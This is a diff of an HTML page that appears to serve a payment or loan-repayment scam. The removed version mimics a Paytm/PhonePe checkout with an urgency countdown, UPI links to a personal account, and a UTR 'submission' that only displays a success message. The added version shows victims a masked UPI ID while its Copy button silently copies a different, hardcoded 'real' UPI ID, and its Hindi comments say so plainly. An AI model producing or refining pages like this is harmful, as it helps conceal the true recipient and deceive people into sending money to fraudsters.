@@ -3,174 +3,152 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Welcome - Payment</title>
+    <title>Repayment Gateway</title>
     <style>
-        * { box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; margin: 0; padding: 0; }
-        body { background-color: #121212; display: flex; justify-content: center; align-items: flex-start; min-height: 100vh; padding: 0; }
-        .wrapper { width: 100%; max-width: 420px; background: #000000; color: #ffffff; min-height: 100vh; display: flex; flex-direction: column; }
-        
-        /* Top Navigation Bar */
-        .navbar { display: flex; align-items: center; justify-content: space-between; padding: 12px 15px; background: #000; }
-        .nav-icon { font-size: 18px; color: #fff; text-decoration: none; cursor: pointer; }
-        .nav-title { font-size: 16px; font-weight: 500; }
-        .nav-dots { font-size: 18px; letter-spacing: 2px; }
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f5f5f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
 
-        /* Amount Bar */
-        .amount-section { background: #000; padding: 8px 18px 16px 18px; text-align: left; }
-        .amount-text { font-size: 13px; color: #ffffff; margin-bottom: 2px; opacity: 0.9; }
-        .amount-text b { font-size: 16px; font-weight: 600; opacity: 1; }
-        .discount-badge { font-size: 11px; color: #ff6a00; font-weight: 500; }
+        .payment-box {
+            background-color: #ffffff;
+            border-radius: 12px;
+            padding: 20px;
+            width: 100%;
+            max-width: 400px;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.1);
+        }
 
-        /* Main Content Cards Container */
-        .content { background: #f5f6f8; border-top-left-radius: 16px; border-top-right-radius: 16px; padding: 16px; flex: 1; color: #333; }
+        .instruction-text {
+            font-size: 14px;
+            color: #333;
+            margin-bottom: 10px;
+        }
 
-        /* Payment Methods Card */
-        .card { background: #ffffff; border-radius: 12px; padding: 16px; margin-bottom: 16px; box-shadow: 0 1px 4px rgba(0,0,0,0.05); }
-        .card-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 12px; }
-        .card-title { font-size: 14px; font-weight: 500; color: #444; }
-        .timer { font-size: 15px; font-weight: bold; color: #ff6a00; }
+        .highlight-amount {
+            color: #ff8c00;
+            font-weight: bold;
+        }
 
-        .app-btn { display: flex; justify-content: space-between; align-items: center; background: #f8f9fb; border: 1px solid #eef0f4; border-radius: 10px; padding: 14px 16px; margin-bottom: 12px; text-decoration: none; color: #333; }
-        .app-btn:last-child { margin-bottom: 0; }
-        .app-logo { height: 26px; display: flex; align-items: center; font-weight: bold; font-size: 18px; }
-        .paytm-text { color: #002e6e; }
-        .paytm-text span { color: #00baf2; }
-        .phonepe-text { color: #5f259f; display: flex; align-items: center; gap: 8px; }
-        .phonepe-icon { background: #5f259f; color: #fff; border-radius: 50%; width: 24px; height: 24px; display: flex; align-items: center; justify-content: center; font-size: 13px; font-weight: bold; }
-        .hand-icon { color: #007bff; font-size: 18px; }
+        .upi-container {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-bottom: 15px;
+        }
 
-        /* Instructions & Copy Section */
-        .section-step { font-size: 13px; color: #555; margin-bottom: 8px; }
-        .section-step span { color: #ff6a00; font-weight: 600; }
-        
-        .copy-box { display: flex; background: #f1f3f6; border-radius: 8px; padding: 4px; margin-bottom: 8px; align-items: center; }
-        .upi-text { flex: 1; text-align: center; font-weight: bold; font-size: 15px; color: #333; }
-        .btn-copy { background: #007bff; color: #fff; border: none; padding: 10px 22px; border-radius: 6px; font-weight: 600; font-size: 14px; cursor: pointer; }
+        /* Masked UPI Input Box */
+        .upi-box {
+            flex: 1;
+            background-color: #f0f0f0;
+            border: 1px solid #e0e0e0;
+            border-radius: 8px;
+            padding: 12px;
+            font-size: 15px;
+            font-weight: bold;
+            color: #333;
+            text-align: center;
+            user-select: none;
+        }
 
-        .warning-tip { font-size: 12px; color: #dc3545; margin-bottom: 16px; text-align: left; }
+        /* Copy Button Styling */
+        .copy-btn {
+            background-color: #007bff;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            padding: 12px 20px;
+            font-size: 15px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background-color 0.2s ease;
+        }
 
-        /* UTR Form Section */
-        .utr-input { width: 100%; background: #f8f9fb; border: 1px solid #e2e6ea; border-radius: 8px; padding: 14px; font-size: 14px; margin-bottom: 16px; color: #333; outline: none; }
-        .utr-input::placeholder { color: #aaa; }
+        .copy-btn:active {
+            background-color: #0056b3;
+        }
 
-        .btn-submit { width: 100%; background: #007bff; color: #ffffff; border: none; padding: 14px; border-radius: 8px; font-size: 16px; font-weight: 600; cursor: pointer; }
-        
-        .footer-tip { text-align: center; font-size: 13px; color: #666; margin-top: 15px; }
-        .footer-tip a { color: #ff6a00; text-decoration: none; font-weight: 500; }
-        
-        .status-msg { display: none; padding: 10px; border-radius: 6px; font-size: 13px; margin-top: 10px; text-align: center; }
+        /* Toast Notification (No Browser Popup) */
+        #toast {
+            visibility: hidden;
+            min-width: 200px;
+            background-color: #333;
+            color: #fff;
+            text-align: center;
+            border-radius: 8px;
+            padding: 12px 16px;
+            position: fixed;
+            z-index: 9999;
+            bottom: 30px;
+            left: 50%;
+            transform: translateX(-50%);
+            font-size: 14px;
+            opacity: 0;
+            transition: opacity 0.3s ease, visibility 0.3s ease;
+        }
+
+        #toast.show {
+            visibility: visible;
+            opacity: 1;
+        }
     </style>
 </head>
 <body>
 
-<div class="wrapper">
-    <!-- Navigation Bar -->
-    <div class="navbar">
-        <span class="nav-icon">&lt;</span>
-        <span class="nav-icon">&times;</span>
-        <span class="nav-title">Welcome</span>
-        <span class="nav-dots">&#8226;&#8226;&#8226;</span>
-    </div>
-
-    <!-- Amount Banner -->
-    <div class="amount-section">
-        <div class="amount-text">Amount Payable: <b>₹14696.99</b></div>
-        <div class="discount-badge">Get ₹0.01 off</div>
-    </div>
-
-    <!-- Main Content -->
-    <div class="content">
-        <!-- Select Payment App -->
-        <div class="card">
-            <div class="card-header">
-                <span class="card-title">Select a method to pay:</span>
-                <span class="timer" id="timer">04:59</span>
-            </div>
-
-            <a href="upi://pay?pa=rohit0309@fam&pn=ExpressCash&am=14696.99" class="app-btn">
-                <div class="app-logo paytm-text">pay<span>tm</span></div>
-                <span class="hand-icon">&#9757;</span>
-            </a>
-
-            <a href="upi://pay?pa=rohit0309@fam&pn=ExpressCash&am=14696.99" class="app-btn">
-                <div class="app-logo phonepe-text">
-                    <span class="phonepe-icon">पे</span> PhonePe
-                </div>
-                <span class="hand-icon">&#9757;</span>
-            </a>
-        </div>
-
-        <!-- Copy UPI & Enter UTR -->
-        <div class="card">
-            <div class="section-step">1.Copy the UPI below and <span>transfer ₹14696.99</span></div>
+    <div class="payment-box">
+        <p class="instruction-text">1. Copy the UPI below and <span class="highlight-amount">transfer ₹14696.99</span></p>
+        
+        <div class="upi-container">
+            <!-- Screen par yeh hidden/masked dikhega -->
+            <div class="upi-box" id="displayUpi">don*************rtel</div>
             
-            <div class="copy-box">
-                <div class="upi-text" id="upi-id">rohit0309@fam</div>
-                <button class="btn-copy" onclick="copyUpi()">Copy</button>
-            </div>
-
-            <div class="warning-tip">Tip: Don't save the upi, this upi is valid for 10 minutes</div>
-
-            <div class="section-step">2.Fill in UTR after payment</div>
-            <input type="text" id="utr" class="utr-input" placeholder="Please enter the 12-character UTR" maxlength="12">
-            <button class="btn-submit" onclick="submitUtr()">Submit UTR</button>
-            
-            <div id="status" class="status-msg"></div>
-        </div>
-
-        <div class="footer-tip">
-            Tip: How to get UTR? Please <a href="#">click here</a>
+            <!-- Click karne par asli UPI copy hogi -->
+            <button class="copy-btn" onclick="copyRealUPI()">Copy</button>
         </div>
     </div>
-</div>
 
-<script>
-    // Countdown Timer Logic
-    let timeInSeconds = 299; // 4:59
-    const timerElement = document.getElementById('timer');
+    <!-- Toast Notification -->
+    <div id="toast">Copied Successfully!</div>
 
-    const countdown = setInterval(() => {
-        let minutes = Math.floor(timeInSeconds / 60);
-        let seconds = timeInSeconds % 60;
-        
-        minutes = minutes < 10 ? '0' + minutes : minutes;
-        seconds = seconds < 10 ? '0' + seconds : seconds;
-        
-        timerElement.innerText = `${minutes}:${seconds}`;
-        
-        if (timeInSeconds <= 0) {
-            clearInterval(countdown);
-            timerElement.innerText = "00:00";
-        } else {
-            timeInSeconds--;
+    <script>
+        // 1. Asli UPI ID yahan rakhein
+        const realUPI = "don1234567890@airtel"; 
+
+        function copyRealUPI() {
+            // Clipboard par asli UPI copy karne ka tareeqa
+            if (navigator.clipboard && navigator.clipboard.writeText) {
+                navigator.clipboard.writeText(realUPI).then(() => {
+                    showToast();
+                }).catch(() => {
+                    fallbackCopy(realUPI);
+                });
+            } else {
+                fallbackCopy(realUPI);
+            }
         }
-    }, 1000);
 
-    // Copy UPI ID
-    function copyUpi() {
-        const upiText = document.getElementById('upi-id').innerText;
-        navigator.clipboard.writeText(upiText);
-        alert('UPI ID copied successfully!');
-    }
-
-    // Submit UTR Validation
-    function submitUtr() {
-        const utr = document.getElementById('utr').value;
-        const status = document.getElementById('status');
-        
-        if (utr.length < 12) {
-            status.style.display = 'block';
-            status.style.background = '#f8d7da';
-            status.style.color = '#721c24';
-            status.innerText = 'Please enter a valid 12-character UTR.';
-        } else {
-            status.style.display = 'block';
-            status.style.background = '#d4edda';
-            status.style.color = '#155724';
-            status.innerText = 'UTR submitted successfully. Processing payment...';
+        function fallbackCopy(text) {
+            var textArea = document.createElement("textarea");
+            textArea.value = text;
+            document.body.appendChild(textArea);
+            textArea.select();
+            document.execCommand("copy");
+            document.body.removeChild(textArea);
+            showToast();
         }
-    }
-</script>
+
+        function showToast() {
+            var toast = document.getElementById("toast");
+            toast.className = "show";
+            setTimeout(function() {
+                toast.className = toast.className.replace("show", "");
+            }, 2000);
+        }
+    </script>
 
 </body>
 </html>
